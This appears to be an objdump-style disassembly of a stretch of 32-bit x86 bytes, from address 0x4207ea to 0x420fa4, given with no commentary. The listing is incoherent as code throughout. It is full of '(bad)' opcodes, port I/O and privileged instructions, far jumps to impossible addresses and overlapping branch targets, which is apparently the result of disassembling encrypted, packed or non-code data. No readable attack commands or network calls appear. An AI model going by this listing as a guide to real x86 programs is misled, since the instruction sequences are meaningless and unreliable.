  4207ea:	ja     0x42082d
  4207ec:	aas    
  4207ed:	popf   
  4207ee:	test   cl,al
  4207f0:	push   esp
  4207f1:	out    0xf,eax
  4207f3:	mov    esi,0x93fbc86d
  4207f8:	leave  
  4207f9:	jns    0x420841
  4207fb:	adc    al,0xd
  4207fd:	cdq    
  4207fe:	mov    ch,0x5b
  420800:	(bad)  
  420801:	jle    0x420817
  420803:	jae    0x420810
  420805:	pop    edx
  420806:	xor    eax,0xa92dc30c
  42080b:	pop    esi
  42080c:	ja     0x4207e6
  42080e:	aas    
  42080f:	fisub  DWORD PTR [esi+eiz*2+0x68]
  420813:	cmp    al,0x46
  420815:	loop   0x420895
  420817:	push   edx
  420818:	mov    eax,0xbf13ec83
  42081d:	xor    bh,BYTE PTR [ebx+0x4ecd3c00]
  420823:	inc    eax
  420824:	rol    BYTE PTR ds:0x929316bc,0xdf
  42082b:	mov    ds:0x41f709c4,al
  420830:	jnp    0x42087e
  420832:	xor    al,BYTE PTR [edx-0x3be21148]
  420838:	and    eax,0xf2f48279
  42083d:	dec    ebx
  42083e:	xchg   edx,eax
  42083f:	xor    edi,edi
  420841:	and    DWORD PTR [ebp-0xb],ebx
  420844:	push   es
  420845:	lock lods al,BYTE PTR ds:[esi]
  420847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420848:	add    eax,0xa93c483
  42084d:	jne    0x4208ac
  42084f:	les    edx,FWORD PTR [ebx]
  420851:	inc    edx
  420852:	into   
  420853:	(bad)  
  420854:	aad    0xb0
  420856:	adc    bh,BYTE PTR [edi]
  420858:	imul   esi,DWORD PTR [ecx+0x16],0x1e236a1e
  42085f:	or     BYTE PTR [edi*2-0xf85b2f0],ah
  420866:	mov    dl,0x25
  420868:	scas   al,BYTE PTR es:[edi]
  420869:	out    0x30,eax
  42086b:	mov    bh,0x6f
  42086d:	into   
  42086e:	(bad)  
  420870:	xor    esi,esi
  420872:	jb     0x420834
  420874:	cdq    
  420875:	push   ss
  420876:	or     al,0x5b
  420878:	jg     0x420844
  42087a:	sub    al,BYTE PTR [ecx-0x56cc6261]
  420880:	es pop edx
  420882:	into   
  420883:	imul   ch
  420885:	or     DWORD PTR [eax+0x675e02ce],ebx
  42088b:	inc    ecx
  42088c:	ja     0x4208c1
  42088e:	push   ds
  42088f:	out    dx,eax
  420890:	js     0x4208c9
  420892:	fimul  WORD PTR [edx+0x62]
  420895:	push   es
  420896:	test   BYTE PTR [esi],al
  420898:	fsubp  st(5),st
  42089a:	add    DWORD PTR [eax+0x3e8c2719],esi
  4208a0:	fwait
  4208a1:	jb     0x420844
  4208a3:	iret   
  4208a4:	shl    DWORD PTR [eax+0xd],0x1d
  4208a8:	xor    DWORD PTR [esp+edi*8],esi
  4208ab:	inc    edi
  4208ac:	sub    eax,0x7e2577bc
  4208b1:	cwde   
  4208b2:	xchg   ebx,eax
  4208b3:	pop    ecx
  4208b4:	out    0x47,al
  4208b6:	(bad)
  4208ba:	add    DWORD PTR [ebp+0x15b681a2],edi
  4208c0:	in     al,dx
  4208c1:	pop    ds
  4208c2:	mov    ah,0xca
  4208c4:	mov    dh,0xd6
  4208c6:	add    eax,0xdaf0febe
  4208cb:	mov    dl,0x28
  4208cd:	inc    edi
  4208ce:	lods   al,BYTE PTR ds:[esi]
  4208cf:	jge    0xf65b587c
  4208d5:	enter  0xab5f,0x4
  4208d9:	js     0x42093f
  4208db:	daa    
  4208dc:	outs   dx,BYTE PTR ds:[esi]
  4208dd:	aaa    
  4208de:	cmp    cl,al
  4208e0:	add    eax,0x16beced6
  4208e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208e6:	cmp    al,0xec
  4208e8:	jne    0x420941
  4208ea:	push   ebp
  4208eb:	inc    edi
  4208ec:	test   DWORD PTR [edx-0x80],ebp
  4208ef:	pusha  
  4208f0:	pop    ebp
  4208f1:	inc    edi
  4208f2:	sbb    DWORD PTR [ecx],0x19
  4208f5:	ret    
  4208f6:	mov    edi,0xb09cf083
  4208fb:	jnp    0x420946
  4208fd:	push   cs
  4208fe:	retf   
  4208ff:	aam    0xa5
  420901:	push   esp
  420902:	push   esp
  420903:	inc    edx
  420904:	lea    edi,[ecx+0x18]
  420907:	fldenv [edx+0xb915f7d]
  42090d:	shl    DWORD PTR [esi-0x33d230cc],1
  420913:	push   esi
  420914:	imul   edx,DWORD PTR [eax-0x14],0x3417fe32
  42091b:	add    BYTE PTR [edx+esi*2+0x236dcf65],ah
  420922:	mul    esp
  420924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420926:	inc    eax
  420927:	sub    ah,BYTE PTR [eax]
  420929:	bound  eax,QWORD PTR [edi-0x5]
  42092c:	js     0x42095d
  42092e:	lahf   
  42092f:	rcl    bh,0xe8
  420932:	cmp    bl,BYTE PTR [ecx+0x55]
  420935:	fiadd  WORD PTR [edx+0x6c]
  420938:	sub    al,0x88
  42093a:	jb     0x42097f
  42093c:	mov    cl,BYTE PTR [esi+0x5c]
  42093f:	inc    esp
  420940:	push   esp
  420941:	cld    
  420942:	test   BYTE PTR ds:0xa6574c15,al
  420948:	(bad)  
  420949:	pop    ebx
  42094a:	jo     0x420912
  42094c:	retf   0xe4bf
  42094f:	repnz sub bl,BYTE PTR [edi-0x2fa8a2f7]
  420956:	das    
  420957:	icebp  
  420958:	test   al,0x36
  42095a:	(bad)  
  42095c:	(bad)  
  42095d:	scas   eax,DWORD PTR es:[edi]
  42095e:	lahf   
  42095f:	xor    ah,bh
  420961:	sbb    BYTE PTR [ebx-0x5e7b0959],0x5b
  420968:	mov    ah,0x68
  42096a:	sbb    DWORD PTR [ebp-0x2d545f09],esp
  420970:	jb     0x4209ef
  420972:	sub    al,0x94
  420974:	xor    DWORD PTR [edi-0x79],edi
  420977:	mov    ecx,0xa654e24d
  42097c:	lea    ebp,[esp+edi*4]
  42097f:	sbb    BYTE PTR [ebx+0x7b753fbb],ch
  420985:	push   ecx
  420986:	or     eax,0xd8a1e07d
  42098b:	int    0xb6
  42098d:	addr16 push cs
  42098f:	sbb    bl,BYTE PTR [edi]
  420991:	inc    ecx
  420992:	sub    BYTE PTR [eax+0x4],bh
  420995:	push   ebp
  420996:	mov    al,0xd2
  420998:	pop    eax
  420999:	popa   
  42099a:	inc    esi
  42099b:	mov    ds:0x6ef3ff0,al
  4209a0:	das    
  4209a1:	in     al,0x37
  4209a3:	addr16 pop es
  4209a5:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209a7:	jmp    0x91a6:0xe199a040
  4209ae:	xor    eax,0x1c53fe71
  4209b3:	inc    esp
  4209b4:	cmp    DWORD PTR [ecx*4+0x5221e92c],0xffffffae
  4209bc:	popf   
  4209bd:	int    0xfc
  4209bf:	pop    es
  4209c0:	rcl    BYTE PTR [edx+0x2b],1
  4209c3:	xor    ch,ch
  4209c5:	pop    eax
  4209c6:	into   
  4209c7:	call   0xee7f34ca
  4209cc:	adc    ebx,ecx
  4209ce:	jecxz  0x420a43
  4209d0:	ja     0x42096e
  4209d2:	pop    edi
  4209d3:	loopne 0x420a0a
  4209d5:	or     eax,ebx
  4209d7:	gs imul ebx,eax,0xbdaadcff
  4209de:	inc    esp
  4209df:	int3   
  4209e0:	rcr    esi,0x6e
  4209e3:	repnz and DWORD PTR [edi+eax*2],ebp
  4209e7:	inc    esp
  4209e8:	add    ebp,DWORD PTR [esi-0x4de1668]
  4209ee:	js     0x420a15
  4209f0:	dec    ebp
  4209f1:	jp     0x4209d3
  4209f3:	out    0x24,eax
  4209f5:	push   ebx
  4209f6:	adc    DWORD PTR [ecx],edi
  4209f8:	(bad)  
  4209f9:	pushf  
  4209fa:	leave  
  4209fb:	push   ecx
  4209fc:	add    BYTE PTR [edi-0x4f],al
  4209ff:	fwait
  420a00:	xchg   ebx,eax
  420a01:	test   edx,ebx
  420a03:	lfs    esp,FWORD PTR [edx-0x7]
  420a07:	dec    ecx
  420a08:	out    dx,al
  420a09:	adc    bl,dh
  420a0b:	or     ecx,ebx
  420a0d:	mov    ah,0xb1
  420a0f:	aaa    
  420a10:	xchg   ebx,eax
  420a11:	fadd   DWORD PTR [esi-0x2a88f574]
  420a17:	mov    ds:0xe0c91ff6,eax
  420a1c:	and    DWORD PTR [edx-0x72cb1958],0x6abf2321
  420a26:	dec    ebp
  420a27:	xchg   esi,eax
  420a28:	xchg   DWORD PTR [ecx-0x63],esi
  420a2b:	cmp    bl,BYTE PTR [eax+0x3e]
  420a2e:	inc    ebp
  420a2f:	mov    eax,0x2da09501
  420a34:	mov    BYTE PTR [edx+esi*1-0x53],0xe5
  420a39:	xchg   edx,eax
  420a3a:	push   ds
  420a3b:	addr16 (bad) 
  420a3d:	outs   dx,BYTE PTR ds:[esi]
  420a3e:	adc    al,0x5d
  420a40:	fsub   st(0),st
  420a42:	and    DWORD PTR [ebx-0x4ca5936c],edx
  420a48:	jno    0x420a15
  420a4a:	sahf   
  420a4b:	push   0xffffff9b
  420a4d:	jmp    0x802f:0xa914215f
  420a54:	fdivr  QWORD PTR [eax]
  420a56:	fst    QWORD PTR [edx]
  420a58:	xor    al,0xc4
  420a5a:	in     eax,dx
  420a5b:	adc    esi,DWORD PTR ds:0xb6d69df2
  420a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a62:	add    DWORD PTR [esi-0x46],0xffffffff
  420a66:	sahf   
  420a67:	mov    esp,0x63887906
  420a6c:	jb     0x420a8f
  420a6e:	cmp    DWORD PTR [esi-0x6e135249],esp
  420a74:	es (bad) 
  420a76:	popa   
  420a77:	jle    0x420aab
  420a79:	xchg   edi,eax
  420a7a:	nop
  420a7b:	out    dx,al
  420a7c:	daa    
  420a7d:	sbb    dh,cl
  420a7f:	call   0xbfc8:0x52545114
  420a86:	pushf  
  420a87:	add    eax,0x2c65b6b5
  420a8c:	cs ret 
  420a8e:	in     eax,0x42
  420a90:	xor    ecx,ebp
  420a92:	out    dx,eax
  420a93:	add    ecx,ebx
  420a95:	daa    
  420a96:	dec    ebp
  420a97:	imul   esp,DWORD PTR [ecx-0xa],0x753d3fc3
  420a9e:	xchg   DWORD PTR [ecx-0x37],edx
  420aa1:	or     edx,DWORD PTR [ecx+0x431545ea]
  420aa7:	push   ecx
  420aa8:	xor    DWORD PTR [ebp+0x77],0x29
  420aac:	(bad)  [ebx+0x351452e9]
  420ab2:	xor    bh,ah
  420ab4:	push   cs
  420ab5:	cli    
  420ab6:	jge    0x420ab1
  420ab8:	ja     0x420abe
  420aba:	mov    bh,0x37
  420abc:	push   ecx
  420abd:	test   al,0x48
  420abf:	mov    edi,0x1befd45
  420ac4:	sub    edi,edi
  420ac6:	jmp    0x26cb9f02
  420acb:	ds repz sbb edi,ebp
  420acf:	test   eax,0xd088a77c
  420ad4:	mov    BYTE PTR [edi+0x76],ah
  420ad7:	das    
  420ad8:	(bad)  
  420ad9:	dec    edi
  420ada:	int    0x1e
  420adc:	jl     0x420b1c
  420ade:	cmp    DWORD PTR [edi-0x32],edx
  420ae1:	or     BYTE PTR [ecx],0x54
  420ae4:	add    eax,0xbb102b36
  420ae9:	push   esp
  420aea:	pop    es
  420aeb:	and    eax,DWORD PTR [edi-0x2399d0f7]
  420af1:	fs pop ds
  420af3:	aaa    
  420af4:	pop    ecx
  420af5:	stos   BYTE PTR es:[edi],al
  420af6:	mov    eax,0x3a9bd5ce
  420afb:	test   DWORD PTR [ebx+0x67b38b6d],0x4023fdf1
  420b05:	mov    WORD PTR [edx+ebp*8+0x74],fs
  420b09:	mov    cl,0xbf
  420b0b:	dec    esi
  420b0c:	or     al,0xaf
  420b0e:	mov    ah,0x61
  420b10:	fs mov ebp,esi
  420b13:	mov    edi,DWORD PTR [esi-0x33f34ac2]
  420b19:	push   ds
  420b1a:	xchg   BYTE PTR [edi],cl
  420b1c:	push   ds
  420b1d:	retf   
  420b1e:	xchg   edx,eax
  420b1f:	mov    dl,BYTE PTR [edi+0x3a]
  420b22:	test   eax,0xa866f9f
  420b27:	shl    BYTE PTR [ecx],0xed
  420b2a:	cli    
  420b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b2c:	js     0x420b29
  420b2e:	adc    ebp,0x6
  420b31:	mov    BYTE PTR [edx+esi*4+0x1bdbde35],0xaf
  420b39:	int3   
  420b3a:	fst    QWORD PTR ds:0xe4a81afc
  420b40:	in     eax,0xc9
  420b42:	add    BYTE PTR [esi],0xb0
  420b45:	enter  0x243d,0x73
  420b49:	call   0x92fa6b1f
  420b4e:	lds    esi,FWORD PTR [esi+ebp*1]
  420b51:	inc    eax
  420b52:	ror    BYTE PTR [edx],cl
  420b54:	int    0x7b
  420b56:	push   es
  420b57:	inc    esp
  420b58:	xchg   ebp,eax
  420b59:	(bad)  
  420b5a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  420b5c:	dec    edx
  420b5d:	mov    DWORD PTR [esi-0x7b17c831],esp
  420b63:	push   0xffffffc4
  420b65:	adc    eax,0x3778dcac
  420b6a:	push   ecx
  420b6b:	rcl    BYTE PTR [ebx-0x305a29c9],1
  420b71:	mov    ds:0x8f5795b8,al
  420b76:	fwait
  420b77:	cwde   
  420b78:	arpl   WORD PTR [eax-0x48b637c3],bp
  420b7e:	gs mov dl,0x9b
  420b81:	xor    al,0x95
  420b83:	push   0x34c0be48
  420b88:	mov    ah,0xf8
  420b8a:	mov    ecx,0xf0ed1726
  420b8f:	jle    0x420bb6
  420b91:	sar    bh,0x8d
  420b94:	adc    al,0xda
  420b96:	pop    edi
  420b97:	out    dx,eax
  420b98:	aaa    
  420b99:	scas   eax,DWORD PTR es:[edi]
  420b9a:	iret   
  420b9b:	les    esi,FWORD PTR [edi]
  420b9d:	or     al,0x9c
  420b9f:	and    ch,BYTE PTR [ecx+0x6]
  420ba2:	ins    DWORD PTR es:[edi],dx
  420ba3:	push   eax
  420ba4:	cmc    
  420ba5:	cwde   
  420ba6:	pop    ss
  420ba7:	scas   eax,DWORD PTR es:[edi]
  420ba8:	(bad)  
  420ba9:	fisubr DWORD PTR [esi+0x67c55ab3]
  420baf:	pop    esp
  420bb0:	test   al,0xae
  420bb2:	mov    ecx,0xb63c0b71
  420bb7:	shr    BYTE PTR [esp+ebx*1+0x1d],1
  420bbb:	mov    ah,0x8d
  420bbd:	xlat   BYTE PTR ds:[ebx]
  420bbe:	mov    ds:0xf240ff8b,al
  420bc3:	push   cs
  420bc4:	inc    esp
  420bc5:	fstp   TBYTE PTR [edi-0x18]
  420bc8:	fldcw  WORD PTR ds:0x97f7fe98
  420bce:	and    DWORD PTR [eax+ebx*4+0x1ae6beb6],ecx
  420bd5:	aas    
  420bd6:	jae    0x420c4a
  420bd8:	inc    esp
  420bd9:	mov    edx,0x785e9040
  420bde:	sbb    eax,0x144aa5c8
  420be3:	mov    dl,0xf2
  420be5:	mov    al,0x4c
  420be7:	mov    ch,0xaa
  420be9:	push   edx
  420bea:	dec    eax
  420beb:	int    0xcf
  420bed:	mov    ss,ecx
  420bef:	div    BYTE PTR [ebx+0x1d9bbc82]
  420bf5:	mov    esp,0xe58b777b
  420bfa:	ret    
  420bfb:	inc    eax
  420bfc:	out    dx,eax
  420bfd:	cmp    BYTE PTR [edi+0x78],ah
  420c00:	jo     0x420bf9
  420c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c03:	ds cld 
  420c05:	cmc    
  420c06:	(bad)  
  420c07:	pushf  
  420c08:	mov    bl,0x88
  420c0a:	ss mov bh,0xd2
  420c0d:	icebp  
  420c0e:	je     0x420bcf
  420c10:	test   esp,esp
  420c12:	js     0x420c1f
  420c14:	loop   0x420c65
  420c16:	xchg   edi,eax
  420c17:	sub    bh,BYTE PTR [eax+edx*8-0x5f32bf65]
  420c1e:	dec    esi
  420c1f:	dec    ebx
  420c20:	pop    edi
  420c21:	jo     0x420bc0
  420c23:	rol    BYTE PTR [eax],1
  420c25:	mov    bl,0x3a
  420c27:	push   es
  420c28:	loopne 0x420c4c
  420c2a:	or     eax,0x8a03aafe
  420c2f:	xor    DWORD PTR [esi+esi*4+0x64],ecx
  420c33:	lock xor al,0xf2
  420c36:	mov    edi,0xaa9e1c7
  420c3b:	arpl   di,sp
  420c3d:	adc    cl,dh
  420c3f:	push   eax
  420c40:	popa   
  420c41:	mov    ds:0x8a04e815,eax
  420c46:	in     eax,dx
  420c47:	imul   ecx,DWORD PTR [ecx+0x23],0xf361245e
  420c4e:	leave  
  420c4f:	pop    eax
  420c50:	shl    DWORD PTR [edx],cl
  420c52:	or     BYTE PTR [ebp-0x4d],bl
  420c55:	icebp  
  420c56:	xchg   ebp,eax
  420c57:	add    DWORD PTR [ebx],esp
  420c59:	or     eax,0x485006aa
  420c5e:	into   
  420c5f:	jno    0x420c5e
  420c61:	call   0x5ca3a26b
  420c66:	mov    eax,DWORD PTR [ecx+0x4e]
  420c69:	addr16 out dx,al
  420c6b:	jp     0x420cb1
  420c6d:	sbb    DWORD PTR [esi+0x7],eax
  420c70:	mov    eax,ds:0xa29a4b6
  420c75:	imul   ecx,DWORD PTR [ecx-0x22fbca1f],0x27351002
  420c7f:	leave  
  420c80:	aaa    
  420c81:	xchg   BYTE PTR [edx+0x4e],cl
  420c84:	jmp    0xd4def3c3
  420c89:	dec    ecx
  420c8a:	fnstenv [edi-0x7d]
  420c8d:	es adc bl,0xc8
  420c91:	lods   al,BYTE PTR ds:[esi]
  420c92:	sahf   
  420c93:	ss xchg edx,eax
  420c95:	add    ah,BYTE PTR [edi]
  420c97:	rol    dh,0x2e
  420c9a:	adc    eax,0xa1d73f9f
  420c9f:	inc    eax
  420ca0:	gs stc 
  420ca2:	mov    ah,0xf0
  420ca4:	add    al,0xf5
  420ca6:	aam    0x7e
  420ca8:	mov    es,esi
  420caa:	leave  
  420cab:	hlt    
  420cac:	push   ebp
  420cad:	mov    eax,ds:0xcb6a98f9
  420cb2:	push   edx
  420cb3:	or     al,0x8f
  420cb5:	push   ds
  420cb6:	test   DWORD PTR [edx-0x9],ebx
  420cb9:	push   0x25b9b76d
  420cbe:	test   al,0x72
  420cc0:	sbb    dh,BYTE PTR [ecx]
  420cc2:	aas    
  420cc3:	sub    al,0x4b
  420cc5:	dec    ebx
  420cc6:	lods   eax,DWORD PTR ds:[esi]
  420cc7:	pop    es
  420cc8:	cld    
  420cc9:	sbb    ebx,ecx
  420ccb:	neg    BYTE PTR [esp+eiz*8+0x68]
  420ccf:	push   esp
  420cd0:	inc    edi
  420cd1:	popa   
  420cd2:	loope  0x420cb7
  420cd4:	fdivr  st,st(4)
  420cd6:	arpl   si,di
  420cd8:	std    
  420cd9:	repz sub edx,DWORD PTR [eax+0x32]
  420cdd:	sub    edx,DWORD PTR [ebx+0x4e]
  420ce0:	xchg   ecx,eax
  420ce1:	add    al,0xce
  420ce3:	loope  0x420cfc
  420ce5:	ds sbb eax,ebx
  420ce8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  420cea:	adc    dl,BYTE PTR [ebp-0x26]
  420ced:	out    dx,eax
  420cee:	mov    eax,ds:0xd8ced2e8
  420cf3:	mov    eax,0x1f264997
  420cf8:	xchg   ebx,eax
  420cf9:	lock add eax,0x469b2d2f
  420cff:	je     0x420c8b
  420d01:	imul   edi,ebp,0x4a
  420d04:	mov    ds:0x3f725a67,al
  420d09:	das    
  420d0a:	dec    edx
  420d0b:	test   DWORD PTR [eax-0x4f017da0],edx
  420d11:	mov    ecx,0x6acf364d
  420d16:	mov    ecx,0xeeae2987
  420d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d1c:	div    cl
  420d1e:	mov    esi,DWORD PTR [edi]
  420d20:	pop    edx
  420d21:	mov    esi,0x43577635
  420d26:	xchg   ebx,eax
  420d27:	(bad)  
  420d28:	push   edx
  420d29:	mov    DWORD PTR [ecx],ebx
  420d2b:	inc    eax
  420d2c:	aaa    
  420d2d:	or     eax,0x1303f0a
  420d32:	iret   
  420d33:	stos   DWORD PTR es:[edi],eax
  420d34:	(bad)
  420d38:	ds test eax,0xe589c80f
  420d3e:	and    cl,0x1d
  420d41:	inc    ebp
  420d42:	ins    BYTE PTR es:[edi],dx
  420d43:	pop    edx
  420d44:	hlt    
  420d45:	mov    eax,0xd1bcf7de
  420d4a:	cmp    eax,0x1bc453d1
  420d4f:	ja     0x420d45
  420d51:	push   eax
  420d52:	mov    ds:0x99d3730f,eax
  420d57:	mov    ecx,0x7efd32bc
  420d5c:	data16 add dh,0x99
  420d60:	cwde   
  420d61:	mov    ax,0xd7bc
  420d65:	xchg   ebp,eax
  420d66:	and    al,0xd6
  420d68:	imul   esi,DWORD PTR [ebx],0x21
  420d6b:	(bad)  
  420d6c:	mov    al,0x1e
  420d6e:	add    bh,bl
  420d70:	lock hlt 
  420d72:	lahf   
  420d73:	push   0x73f627c2
  420d78:	(bad)  
  420d79:	xchg   ebx,eax
  420d7a:	adc    cl,BYTE PTR [eax+edi*1]
  420d7d:	push   ds
  420d7e:	jmp    0xc9a6b1e0
  420d83:	mov    al,0x8b
  420d85:	push   0xffffffdd
  420d87:	and    al,0x5f
  420d89:	dec    ebp
  420d8a:	hlt    
  420d8b:	adc    al,0xc2
  420d8d:	out    0xdf,eax
  420d8f:	xchg   ecx,eax
  420d90:	push   edi
  420d91:	jp     0x420d46
  420d93:	fst    DWORD PTR [ebx+edx*2+0x41]
  420d97:	push   ebx
  420d98:	rol    DWORD PTR [ebx],1
  420d9a:	mov    bh,al
  420d9c:	(bad)  
  420d9e:	(bad)  
  420d9f:	jno    0x420d93
  420da1:	inc    ecx
  420da2:	jmp    0x13f1:0xf8879681
  420da9:	int    0x72
  420dab:	sbb    eax,0x7070177e
  420db0:	inc    eax
  420db1:	mov    WORD PTR [esi],?
  420db3:	(bad)  
  420db4:	sub    al,0xd2
  420db6:	int    0x2
  420db8:	mov    edx,0xd233fd8e
  420dbe:	pop    esp
  420dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dc0:	fdiv   QWORD PTR ds:0x9a255dbf
  420dc6:	imul   edx,DWORD PTR [edx+0x61],0xffffff88
  420dca:	xlat   BYTE PTR ds:[ebx]
  420dcb:	jns    0x420e30
  420dcd:	sbb    BYTE PTR [edx+0x1e],0x47
  420dd1:	aad    0xc7
  420dd3:	les    esp,FWORD PTR [edx+esi*8+0x69a09dcf]
  420dda:	pop    es
  420ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ddc:	pop    edx
  420ddd:	sbb    al,0x51
  420ddf:	jmp    0xcbedf7cb
  420de4:	fisubr WORD PTR [edi]
  420de6:	dec    ebp
  420de7:	fdiv   QWORD PTR [edx]
  420de9:	inc    edx
  420dea:	fnstsw WORD PTR [eax-0x206d053d]
  420df0:	hlt    
  420df1:	push   eax
  420df2:	hlt    
  420df3:	cmp    DWORD PTR [ebx],edi
  420df5:	test   BYTE PTR [ebp+0x6a],cl
  420df8:	icebp  
  420df9:	clc    
  420dfa:	test   DWORD PTR [eax-0x1696b4ba],eax
  420e00:	push   eax
  420e01:	rol    BYTE PTR [esi],0x50
  420e04:	test   DWORD PTR [edi+esi*4+0x1dc05262],0x59219523
  420e0f:	jle    0x420dff
  420e11:	cs pop ds
  420e13:	(bad)  
  420e15:	fcom   QWORD PTR [esi-0x3d]
  420e18:	xchg   ebp,edx
  420e1a:	sbb    DWORD PTR [ebp+0x44],ecx
  420e1d:	nop
  420e1e:	pavgb  mm2,QWORD PTR [eax]
  420e21:	jne    0x420e2f
  420e23:	and    cl,BYTE PTR [ebp+0x19]
  420e26:	popf   
  420e27:	test   al,0xd2
  420e29:	inc    ebp
  420e2a:	test   DWORD PTR [esi],esi
  420e2c:	cmp    BYTE PTR [esi-0x1],bh
  420e2f:	lahf   
  420e30:	jmp    0x420e47
  420e32:	xchg   esi,eax
  420e33:	jecxz  0x420e7b
  420e35:	xor    DWORD PTR fs:[edx],0xffffffa0
  420e39:	cld    
  420e3a:	lahf   
  420e3b:	arpl   WORD PTR [edx+0x4d3a239d],ax
  420e41:	call   0xa901c897
  420e46:	inc    ebx
  420e47:	mov    ah,0x3
  420e49:	push   esi
  420e4a:	fimul  WORD PTR [edi]
  420e4c:	xchg   edi,eax
  420e4d:	cmc    
  420e4e:	gs push cs
  420e50:	das    
  420e51:	imul   ecx,DWORD PTR ds:0x54f4ef42,0xba2d7205
  420e5b:	xchg   ebx,eax
  420e5c:	sbb    esi,edx
  420e5e:	pop    ebx
  420e5f:	dec    ebx
  420e60:	jo     0x420eb5
  420e62:	pop    edx
  420e63:	loopne 0x420df6
  420e65:	xchg   ebp,eax
  420e66:	inc    eax
  420e67:	jmp    0xb9806b0a
  420e6c:	in     eax,0x1f
  420e6e:	lods   eax,DWORD PTR ds:[esi]
  420e6f:	add    al,0x3
  420e71:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  420e73:	push   es
  420e74:	frstor [eax+0x34b52561]
  420e7a:	xchg   ecx,eax
  420e7b:	leave  
  420e7c:	in     al,0x43
  420e7e:	call   0xe922:0x184ded83
  420e85:	jnp    0x420ee2
  420e87:	sbb    BYTE PTR [ebx-0x6],cl
  420e8a:	test   al,0x86
  420e8c:	iret   
  420e8d:	ror    BYTE PTR [esi-0x483921d3],0x59
  420e94:	outs   dx,DWORD PTR ds:[esi]
  420e95:	add    DWORD PTR [ecx+0x3d],esi
  420e98:	push   0x41
  420e9a:	loopne 0x420ed0
  420e9c:	hlt    
  420e9d:	call   0x8c04:0xcb9133f
  420ea4:	mov    eax,ds:0x6a65f900
  420ea9:	mov    dl,0x17
  420eab:	dec    ebp
  420eac:	dec    edi
  420ead:	retf   0x9081
  420eb0:	push   esp
  420eb1:	(bad)  
  420eb3:	sbb    ah,BYTE PTR ss:[esi]
  420eb6:	pushf  
  420eb7:	scas   al,BYTE PTR es:[edi]
  420eb8:	rol    DWORD PTR [esi+0x28],0x24
  420ebc:	(bad)  
  420ebd:	xor    al,0xbf
  420ebf:	fwait
  420ec0:	jne    0x420e9e
  420ec2:	rcl    DWORD PTR [edx+0x28],0xaf
  420ec6:	sub    BYTE PTR [edi],bl
  420ec8:	clc    
  420ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eca:	imul   BYTE PTR [esi-0x6bb9fe36]
  420ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ed1:	sub    al,0x8c
  420ed3:	adc    eax,0xf0e7fad4
  420ed8:	iret   
  420ed9:	mov    DWORD PTR [edi-0x42ae21b2],esi
  420edf:	mov    al,ds:0x266cd139
  420ee4:	and    BYTE PTR ds:0x6ec03df,cl
  420eea:	or     BYTE PTR [ebx-0x31],0x36
  420eee:	mov    ch,0x62
  420ef0:	std    
  420ef1:	test   al,0x45
  420ef3:	jle    0x420e89
  420ef5:	pop    ebx
  420ef6:	aaa    
  420ef7:	sub    ebp,ebp
  420ef9:	cmp    esp,DWORD PTR [ebp+0x61]
  420efc:	cmp    cl,BYTE PTR [edx-0x80]
  420eff:	cdq    
  420f00:	les    esp,FWORD PTR [ebp+eax*4-0x67]
  420f04:	mov    DWORD PTR [ebx],ebx
  420f06:	push   ss
  420f07:	sbb    DWORD PTR [edi-0x7731750e],eax
  420f0d:	or     eax,0x71fc9f6d
  420f12:	mov    BYTE PTR [edx+0x5b67dea0],ah
  420f18:	ret    0xa009
  420f1b:	(bad)  
  420f1c:	pop    ebx
  420f1d:	mov    ch,0x2b
  420f1f:	xchg   edx,eax
  420f20:	lods   eax,DWORD PTR ds:[esi]
  420f21:	and    al,0xcc
  420f23:	scas   eax,DWORD PTR es:[edi]
  420f24:	inc    esp
  420f25:	lahf   
  420f26:	sbb    DWORD PTR [ebx],edi
  420f28:	jbe    0x420f1e
  420f2a:	push   ss
  420f2b:	test   BYTE PTR ds:0xb384428e,cl
  420f31:	arpl   WORD PTR [esp+eiz*2],sp
  420f34:	rol    BYTE PTR [eax],cl
  420f36:	aas    
  420f37:	scas   al,BYTE PTR es:[edi]
  420f38:	mov    bl,0x77
  420f3a:	push   ebx
  420f3b:	mov    eax,0xcf4d5e5f
  420f40:	pop    edx
  420f41:	(bad)  
  420f42:	jl     0x420f89
  420f44:	mov    bl,0xe
  420f46:	adc    eax,0xd94eefab
  420f4b:	icebp  
  420f4c:	es mov cl,0x1c
  420f4f:	push   cs
  420f50:	inc    eax
  420f51:	ret    
  420f52:	mov    ebx,0xcde50b32
  420f57:	jle    0x420fba
  420f59:	retf   0x5740
  420f5c:	push   edx
  420f5d:	cmp    DWORD PTR [ebp+ecx*4-0x76],ecx
  420f61:	div    DWORD PTR [edx+ecx*4-0x66]
  420f65:	adc    BYTE PTR [edi+0x4c],bl
  420f68:	adc    eax,0x3a9a3b88
  420f6d:	fidivr WORD PTR [ecx]
  420f6f:	call   DWORD PTR [eax]
  420f71:	add    BYTE PTR [ecx+0x71ad131a],bh
  420f77:	inc    ecx
  420f78:	(bad)  
  420f79:	ss (bad) 
  420f7b:	call   0x246f3c81
  420f80:	and    esi,DWORD PTR [ebx+0x2d44e3ac]
  420f86:	scas   eax,DWORD PTR es:[edi]
  420f87:	sub    eax,0xd8d35c2d
  420f8c:	popf   
  420f8d:	jb     0x420fd8
  420f8f:	sti    
  420f90:	loop   0x420ffc
  420f92:	ds inc edx
  420f94:	fcmovb st,st(2)
  420f96:	popf   
  420f97:	jl     0x420f4b
  420f99:	ss repz push ds
  420f9c:	cmp    DWORD PTR [edx],esp
  420f9e:	dec    ecx
  420f9f:	adc    al,0x1d
  420fa1:	inc    esp
  420fa2:	neg    bl
  420fa4:	push   0xa9e611e
